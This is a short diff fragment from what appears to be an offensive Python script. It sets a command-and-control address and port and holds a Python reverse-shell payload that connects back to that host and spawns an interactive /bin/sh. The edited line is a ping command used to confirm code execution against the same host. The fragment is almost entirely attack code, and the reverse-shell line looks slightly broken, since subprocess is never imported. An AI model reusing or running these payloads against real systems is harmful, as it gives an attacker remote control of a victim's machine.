@@ -25,7 +25,7 @@ TIME = int(time.time())
 C2 = "192.168.249.128"
 PORT = 443
 PAYLOAD = "python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+C2+",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"])'"
-PAYLOAD1 = "python3 -c 'os.system(\"ping -c 1 \" + "+C2+")'"
+PAYLOAD1 = "python3 -c 'import os;os.system(\"ping -c 1 \" + \""+C2+"\")'"
 
 
 def touch_file():
